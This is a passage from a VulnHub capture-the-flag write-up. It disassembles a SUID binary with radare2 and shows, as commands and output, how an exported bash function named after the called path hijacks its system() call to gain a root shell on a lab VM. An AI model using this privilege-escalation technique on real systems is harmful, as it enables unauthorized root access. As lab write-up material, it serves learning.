<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.2<span class="nv">$ </span>find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
</span><span class='line'>find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
</span><span class='line'>/usr/bin/mount
</span><span class='line'>/usr/bin/chage
</span><span class='line'>/usr/bin/gpasswd
</span><span class='line'>/usr/bin/newgrp
</span><span class='line'>/usr/bin/chfn
</span><span class='line'>/usr/bin/su
</span><span class='line'>/usr/bin/chsh
</span><span class='line'>/usr/bin/umount
</span><span class='line'>/usr/bin/sudo
</span><span class='line'>/usr/bin/pkexec
</span><span class='line'>/usr/bin/crontab
</span><span class='line'>/usr/bin/nightmare
</span><span class='line'>/usr/bin/passwd
</span><span class='line'>/usr/sbin/pam_timestamp_check
</span><span class='line'>/usr/sbin/unix_chkpwd
</span><span class='line'>/usr/sbin/usernetctl
</span><span class='line'>/usr/lib/polkit-1/polkit-agent-helper-1
</span><span class='line'>/usr/lib64/dbus-1/dbus-daemon-launch-helper
</span><span class='line'>bash-4.2<span class="nv">$ </span>ls -alh /usr/bin/nightmare
</span><span class='line'>ls -alh /usr/bin/nightmare
</span><span class='line'>-rwsr-s<span class="p">&amp;</span>mdash<span class="p">;</span>. <span class="m">1</span> root tomcat 8.5K Jan <span class="m">18</span>  <span class="m">2015</span> /usr/bin/nightmare
</span></code></pre></td></tr></table></div></figure></p>

<p>Download the binary &ldquo;/usr/bin/nightmare&rdquo; to my local Kali Linux and using disassembler <code>Radare 2</code> to analyze the binary.</p>

<p>Disassemble all functions and print the code of function &lsquo;main&rsquo;:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nl">root@kali:</span><span class="err">~/</span><span class="nf">myNotes</span><span class="err">/</span><span class="no">Vulnhub_notes</span><span class="err">/</span><span class="no">the</span> <span class="no">sleepy</span><span class="c"># r2 nightmare</span>
</span><span class='line'><span class="err">[0</span><span class="nf">x004006b0</span><span class="err">]&gt;</span> <span class="no">aa</span>
</span><span class='line'><span class="err">[0</span><span class="nf">x004006b0</span><span class="err">]&gt;</span> <span class="no">pdf</span> <span class="err">@</span> <span class="no">main</span>
</span><span class='line'><span class="err">/</span> <span class="err">(</span><span class="nf">fcn</span><span class="p">)</span> <span class="no">sym.main</span> <span class="mi">250</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040083e</span>    <span class="mi">55</span>           <span class="no">push</span> <span class="no">rbp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040083f</span>    <span class="mi">4889</span><span class="no">e5</span>       <span class="no">mov</span> <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400842</span>    <span class="mi">4881</span><span class="no">eca0000.</span> <span class="no">sub</span> <span class="no">rsp</span><span class="p">,</span> <span class="mi">0xa0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400849</span>    <span class="mi">488</span><span class="no">d8560fff.</span> <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="err">[</span><span class="no">rbp-0xa0</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400850</span>    <span class="no">ba98000000</span>   <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x98</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400855</span>    <span class="no">be00000000</span>   <span class="no">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040085a</span>    <span class="mi">4889</span><span class="no">c7</span>       <span class="no">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x00400660</span> <span class="p">(</span><span class="no">fcn.00400656</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040085d</span>    <span class="no">e8fefdffff</span>   <span class="no">call</span> <span class="no">sym.imp.memset</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.memset</span><span class="p">(</span><span class="no">unk</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400862</span>    <span class="mi">48</span><span class="no">c78560fff.</span> <span class="no">mov</span> <span class="no">qword</span> <span class="err">[</span><span class="no">rbp-0xa0</span><span class="err">]</span><span class="p">,</span> <span class="no">sym.sigHandler</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040086d</span>    <span class="no">c745e800000.</span> <span class="no">mov</span> <span class="no">dword</span> <span class="err">[</span><span class="no">rbp-0x18</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400874</span>    <span class="mi">488</span><span class="no">d8560fff.</span> <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="err">[</span><span class="no">rbp-0xa0</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040087b</span>    <span class="no">ba00000000</span>   <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400880</span>    <span class="mi">4889</span><span class="no">c6</span>       <span class="no">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rax</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400883</span>    <span class="no">bf02000000</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0x2</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x00400610</span> <span class="p">(</span><span class="no">fcn.00400606</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400888</span>    <span class="no">e883fdffff</span>   <span class="no">call</span> <span class="no">sym.imp.sigaction</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.sigaction</span><span class="p">()</span>
</span><span class='line'><span class="err">&amp;</span><span class="nf">hellip</span><span class="err">;</span> <span class="no">turncate</span> <span class="err">&amp;</span><span class="no">hellip</span><span class="err">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>From the result above, I notice that there is a function <code>sym.sigHandler</code> be used to deal with signal <code>SIGINT(0x2)</code> and <code>SIGTERM(0xf)</code>, so I decided to print it out</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="err">[0</span><span class="nf">x004006b0</span><span class="err">]&gt;</span> <span class="no">pdf</span> <span class="err">@</span> <span class="no">sym.sigHandler</span>
</span><span class='line'><span class="err">/</span> <span class="err">(</span><span class="nf">fcn</span><span class="p">)</span> <span class="no">sym.sigHandler</span> <span class="mi">281</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040081f</span>    <span class="mi">55</span>           <span class="no">push</span> <span class="no">rbp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400820</span>    <span class="mi">4889</span><span class="no">e5</span>       <span class="no">mov</span> <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400823</span>    <span class="mi">4883</span><span class="no">ec10</span>     <span class="no">sub</span> <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x10</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400827</span>    <span class="mi">897</span><span class="no">dfc</span>       <span class="no">mov</span> <span class="err">[</span><span class="no">rbp-0x4</span><span class="err">]</span><span class="p">,</span> <span class="no">edi</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040082a</span>    <span class="no">b800000000</span>   <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040082f</span>    <span class="no">e899ffffff</span>   <span class="no">call</span> <span class="no">sym.train</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.train</span><span class="p">(</span><span class="no">unk</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400834</span>    <span class="no">bf00000000</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400839</span>    <span class="no">e862feffff</span>   <span class="no">call</span> <span class="no">sym.imp.exit</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.exit</span><span class="p">()</span>
</span><span class='line'><span class="err">/</span> <span class="err">(</span><span class="nf">fcn</span><span class="p">)</span> <span class="no">sym.main</span> <span class="mi">250</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040083e</span>    <span class="mi">55</span>           <span class="no">push</span> <span class="no">rbp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040083f</span>    <span class="mi">4889</span><span class="no">e5</span>       <span class="no">mov</span> <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400842</span>    <span class="mi">4881</span><span class="no">eca0000.</span> <span class="no">sub</span> <span class="no">rsp</span><span class="p">,</span> <span class="mi">0xa0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400849</span>    <span class="mi">488</span><span class="no">d8560fff.</span> <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="err">[</span><span class="no">rbp-0xa0</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400850</span>    <span class="no">ba98000000</span>   <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x98</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400855</span>    <span class="no">be00000000</span>   <span class="no">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040085a</span>    <span class="mi">4889</span><span class="no">c7</span>       <span class="no">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x00400660</span> <span class="p">(</span><span class="no">fcn.00400656</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040085d</span>    <span class="no">e8fefdffff</span>   <span class="no">call</span> <span class="no">sym.imp.memset</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.memset</span><span class="p">(</span><span class="no">unk</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400862</span>    <span class="mi">48</span><span class="no">c78560fff.</span> <span class="no">mov</span> <span class="no">qword</span> <span class="err">[</span><span class="no">rbp-0xa0</span><span class="err">]</span><span class="p">,</span> <span class="no">sym.sigHandler</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040086d</span>    <span class="no">c745e800000.</span> <span class="no">mov</span> <span class="no">dword</span> <span class="err">[</span><span class="no">rbp-0x18</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400874</span>    <span class="mi">488</span><span class="no">d8560fff.</span> <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="err">[</span><span class="no">rbp-0xa0</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040087b</span>    <span class="no">ba00000000</span>   <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400880</span>    <span class="mi">4889</span><span class="no">c6</span>       <span class="no">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rax</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400883</span>    <span class="no">bf02000000</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0x2</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x00400610</span> <span class="p">(</span><span class="no">fcn.00400606</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400888</span>    <span class="no">e883fdffff</span>   <span class="no">call</span> <span class="no">sym.imp.sigaction</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.sigaction</span><span class="p">()</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040088d</span>    <span class="mi">488</span><span class="no">d8560fff.</span> <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="err">[</span><span class="no">rbp-0xa0</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400894</span>    <span class="no">ba00000000</span>   <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400899</span>    <span class="mi">4889</span><span class="no">c6</span>       <span class="no">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rax</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040089c</span>    <span class="no">bf0f000000</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0xf</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004008a1</span>    <span class="no">e86afdffff</span>   <span class="no">call</span> <span class="no">sym.imp.sigaction</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.sigaction</span><span class="p">()</span>
</span><span class='line'><span class="err">&amp;</span><span class="nf">hellip</span><span class="err">;</span> <span class="no">turncate</span> <span class="err">&amp;</span><span class="no">hellip</span><span class="err">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Here is another function &ldquo;sym.train&rdquo; be called:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="err">[0</span><span class="nf">x004006b0</span><span class="err">]&gt;</span> <span class="no">pdf</span> <span class="err">@</span> <span class="no">sym.train</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x0040082f</span> <span class="p">(</span><span class="no">unk</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x004007cd</span> <span class="p">(</span><span class="no">unk</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x0040080f</span> <span class="p">(</span><span class="no">unk</span><span class="p">)</span>
</span><span class='line'><span class="err">/</span> <span class="err">(</span><span class="nf">fcn</span><span class="p">)</span> <span class="no">sym.train</span> <span class="mi">66</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007cd</span>    <span class="mi">55</span>           <span class="no">push</span> <span class="no">rbp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007ce</span>    <span class="mi">4889</span><span class="no">e5</span>       <span class="no">mov</span> <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007d1</span>    <span class="no">ba00000000</span>   <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007d6</span>    <span class="no">be00000000</span>   <span class="no">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007db</span>    <span class="no">bf00000000</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007e0</span>    <span class="no">b800000000</span>   <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007e5</span>    <span class="no">e836feffff</span>   <span class="no">call</span> <span class="no">sym.imp.setresuid</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.setresuid</span><span class="p">(</span><span class="no">unk</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007ea</span>    <span class="no">ba00000000</span>   <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007ef</span>    <span class="no">be00000000</span>   <span class="no">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007f4</span>    <span class="no">bf00000000</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007f9</span>    <span class="no">b800000000</span>   <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007fe</span>    <span class="no">e82dfeffff</span>   <span class="no">call</span> <span class="no">sym.imp.setresgid</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.setresgid</span><span class="p">()</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400803</span>    <span class="no">bfec094000</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="no">str.usrbinslal</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x00400640</span> <span class="p">(</span><span class="no">fcn.00400636</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400808</span>    <span class="no">e833feffff</span>   <span class="no">call</span> <span class="no">sym.imp.system</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.system</span><span class="p">()</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040080d</span>    <span class="mi">5</span><span class="no">d</span>           <span class="no">pop</span> <span class="no">rbp</span>
</span><span class='line'><span class="err">\</span>           <span class="err">0</span><span class="nf">x0040080e</span>    <span class="no">c3</span>           <span class="no">ret</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>In this function <code>sym.train</code>, the attacker noticed that uid and gid have been set to &lsquo;0&rsquo; (which is ROOT) and then make a system call with parameter <code>str.usrbinslal</code>.</p>

<p>By checking the string of &ldquo;str.usrbinslal&rdquo; as follow, I know the system function has been called like this <code>system("/usr/bin/sl -al")</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="err">[0</span><span class="nf">x004006b0</span><span class="err">]&gt;</span> <span class="no">ps</span> <span class="err">@</span> <span class="no">str.usrbinslal</span>
</span><span class='line'><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sl</span> <span class="p">-</span><span class="no">al</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Based on <a href="https://research.g0blin.co.uk/devrandom-sleepy-vulnhub-writeup/" title="g0blin's walkthrough">g0blin&rsquo;s post</a>, I defined an evil function by using sl&rsquo;s full path as the name <code>/usr/bin/sl</code> and then run the vulnerable program <code>nightmare</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.2<span class="nv">$ </span><span class="k">function</span> /usr/bin/sl <span class="o">()</span> <span class="o">{</span> /bin/bash<span class="p">;</span> <span class="o">}</span>
</span><span class='line'><span class="k">function</span> /usr/bin/sl <span class="o">()</span> <span class="o">{</span> /bin/bash<span class="p">;</span> <span class="o">}</span>
</span><span class='line'>bash-4.2<span class="nv">$ </span><span class="nb">export</span> -f /usr/bin/sl
</span><span class='line'><span class="nb">export</span> -f /usr/bin/sl
</span><span class='line'>bash-4.2<span class="nv">$ </span>/usr/bin/nightmare
</span><span class='line'>/usr/bin/nightmare
</span><span class='line'>Error opening terminal: unknown.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Again <span class="o">[</span>y/n<span class="o">]</span>?
</span></code></pre></td></tr></table></div></figure></p>

<p>In order to send <code>SIGTERM</code> signal to <code>nightware</code>, I opened another MSF session by refreshing the trojan web page.</p>

<p>In the new session, I sent <code>SIGTERM</code> signal to process <code>nightmare</code> by using command <code>kill -15 &lt;pid&gt;</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.2<span class="nv">$ </span>ps aux <span class="p">|</span> grep night
</span><span class='line'>ps aux <span class="p">|</span> grep night
</span><span class='line'>root      <span class="m">2312</span>  0.0  0.0   <span class="m">4164</span>   <span class="m">356</span> pts/0    S+   00:29   0:00 /usr/bin/nightmare
</span><span class='line'>tomcat    <span class="m">2329</span>  0.0  0.1   <span class="m">9032</span>   <span class="m">672</span> pts/1    R+   00:33   0:00 grep night
</span><span class='line'>bash-4.2<span class="nv">$ </span><span class="nb">kill</span> -15 2312
</span><span class='line'><span class="nb">kill</span> -15 2312
</span></code></pre></td></tr></table></div></figure></p>

<p>Now change back to previous session and we got ROOT!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.2<span class="nv">$ </span><span class="k">function</span> /usr/bin/sl <span class="o">()</span> <span class="o">{</span> /bin/bash<span class="p">;</span> <span class="o">}</span>
</span><span class='line'>bash-4.2<span class="nv">$ </span><span class="nb">export</span> -f /usr/bin/sl
</span><span class='line'>bash-4.2<span class="nv">$ </span>/usr/bin/nightmare
</span><span class='line'>Error opening terminal: unknown.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Again <span class="o">[</span>y/n<span class="o">]</span>?
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Again <span class="o">[</span>y/n<span class="o">]</span>? bash-4.2#&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;bash-4.2# id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,91<span class="o">(</span>tomcat<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:tomcat_t:s0
</span><span class='line'>bash-4.2# ls -al /root
</span><span class='line'>ls -al /root
</span><span class='line'>total 44
</span><span class='line'>dr-xr-x<span class="p">&amp;</span>mdash<span class="p">;</span>.  <span class="m">3</span> root root  <span class="m">4096</span> Jun <span class="m">19</span> 00:52 .
</span><span class='line'>drwxr-xr-x. <span class="m">18</span> root root  <span class="m">4096</span> Nov <span class="m">13</span> 21:59 ..
</span><span class='line'>lrwxrwxrwx.  <span class="m">1</span> root root     <span class="m">9</span> Jan <span class="m">18</span>  <span class="m">2015</span> .bash_history -&gt; /dev/null
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>.  <span class="m">1</span> root root    <span class="m">18</span> Dec <span class="m">29</span>  <span class="m">2013</span> .bash_logout
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>.  <span class="m">1</span> root root   <span class="m">176</span> Dec <span class="m">29</span>  <span class="m">2013</span> .bash_profile
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>.  <span class="m">1</span> root root   <span class="m">100</span> Dec <span class="m">29</span>  <span class="m">2013</span> .cshrc
